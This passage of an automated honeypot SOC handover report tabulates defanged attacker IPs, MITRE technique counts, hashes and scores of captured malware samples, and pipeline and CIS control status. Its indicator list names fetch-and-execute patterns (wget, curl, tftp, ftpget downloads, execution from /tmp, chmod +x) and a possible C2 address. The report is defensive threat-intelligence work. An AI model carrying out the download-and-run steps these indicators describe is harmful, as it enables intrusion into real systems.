| `194.165.16[.]165` | **6** | 2026-08-15 07:14 | 2026-08-15 07:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-15 06:55 | 2026-08-15 08:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `78.56.49[.]227` | **4** | 2026-08-15 08:34 | 2026-08-15 08:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `181.115.192[.]10` | **3** | 2026-08-15 08:53 | 2026-08-15 08:54 | 1m | 0 | `T1592` | 🟢 LOW |
| `45.33.80[.]243` | **3** | 2026-08-15 08:43 | 2026-08-15 08:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **3** | 2026-08-15 08:28 | 2026-08-15 08:47 | 1m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **2** | 2026-08-15 07:35 | 2026-08-15 08:14 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]202` | **2** | 2026-08-15 07:07 | 2026-08-15 07:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.238.110[.]208` | 1 | 2026-08-15 07:10 | 2026-08-15 07:11 | 37s | 0 | `T1592` | 🟢 LOW |
| `117.69.255[.]239` | 1 | 2026-08-15 07:16 | 2026-08-15 07:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.202.146[.]144` | 1 | 2026-08-15 08:53 | 2026-08-15 08:54 | 9s | 0 | `T1592` | 🟢 LOW |
| `165.232.61[.]133` | 1 | 2026-08-15 07:52 | 2026-08-15 07:52 | 1s | 0 | `T1592` | 🟢 LOW |
| `180.210.206[.]32` | 1 | 2026-08-15 08:32 | 2026-08-15 08:32 | 7s | 0 | `T1592` | 🟢 LOW |
| `181.225.32[.]48` | 1 | 2026-08-15 08:34 | 2026-08-15 08:34 | 11s | 0 | `T1592` | 🟢 LOW |
| `181.44.170[.]243` | 1 | 2026-08-15 07:41 | 2026-08-15 07:41 | 10s | 0 | `T1592` | 🟢 LOW |
| `182.252.140[.]114` | 1 | 2026-08-15 08:50 | 2026-08-15 08:51 | 5s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-08-15 07:51 | 2026-08-15 07:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.189.209[.]18` | 1 | 2026-08-15 07:19 | 2026-08-15 07:19 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]82` | 1 | 2026-08-15 08:32 | 2026-08-15 08:32 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-08-15 08:39 | 2026-08-15 08:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-08-15 08:43 | 2026-08-15 08:43 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-08-15 08:47 | 2026-08-15 08:47 | 1s | 0 | `T1592` | 🟢 LOW |
| `46.147.195[.]11` | 1 | 2026-08-15 07:18 | 2026-08-15 07:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]13` | 1 | 2026-08-15 07:08 | 2026-08-15 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]14` | 1 | 2026-08-15 07:20 | 2026-08-15 07:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.3.154[.]197` | 1 | 2026-08-15 08:34 | 2026-08-15 08:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.57.154[.]146` | 1 | 2026-08-15 07:29 | 2026-08-15 07:29 | 15s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-08-15 07:20 | 2026-08-15 07:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-08-15 07:41 | 2026-08-15 07:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]16` | 1 | 2026-08-15 08:37 | 2026-08-15 08:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.177.209[.]247` | 1 | 2026-08-15 07:22 | 2026-08-15 07:22 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.224.92[.]92` | 1 | 2026-08-15 07:02 | 2026-08-15 07:02 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `121.202.146[.]144` | HK | SmarTone Mobile Communications Ltd | **100** ⚠️ | 50 |
| `49.124.151[.]13` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 50 |
| `60.166.8[.]174` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `211.169.212[.]206` | KR | DACOM Corp. | **100** ⚠️ | 50 |
| `111.39.167[.]59` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `31.173.0[.]46` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `181.44.170[.]243` | AR | Telecentro S.A. | **100** ⚠️ | 2 |
| `220.189.209[.]18` | CN | Zhongke Taineng Gaoming Science and Technology Development Co., Ltd. | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `194.195.210[.]47` | US | Linode, LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 223 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 210 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (33 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 1 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 3 |
| AbuseIPDB score 18 below threshold 25 | 2 |
| AbuseIPDB score 20 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 6500 cases |
| Tool 34  | Credential Extractor        | ✅ 238 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 93 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 33 filtered (0.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 67 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 210 priority case(s) shown individually · 34 recon entry/entries in table (10 group(s) consolidating 6233 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-15T10:27:07Z_
